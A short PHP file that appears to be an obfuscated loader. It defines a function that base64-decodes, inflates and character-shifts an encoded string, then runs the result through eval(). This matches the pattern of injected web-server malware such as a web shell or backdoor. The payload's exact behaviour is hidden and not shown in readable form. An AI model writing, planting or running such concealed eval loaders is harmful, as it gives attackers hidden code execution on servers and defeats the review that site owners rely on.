<?php function oQu($REMYJ)
{ 
$REMYJ=gzinflate(base64_decode($REMYJ));
 for($i=0;$i<strlen($REMYJ);$i++)
 {
$REMYJ[$i] = chr(ord($REMYJ[$i])-1);
 }
 return $REMYJ;
 }eval(oQu("XY7NCsIwEIQfYJ9iCT3UUxR6yxpP9abg30lEYhtNoSZQUlHEZ3epQcS5LDPzMSwiC2zlAgpy8dpqIGdNrSk2sbW6GBe4DBHnofc1yU9IckCATqF+8Kmsj7bT5Cb/PCckU83DzCTjL42//1QyTcnhB6EA7M20mJt8NFJw7n0Vm+CR7RMwKTM4xey4Lle7crPdi4U4qG/Z2dh3nhkFL4CZBoA3"));?>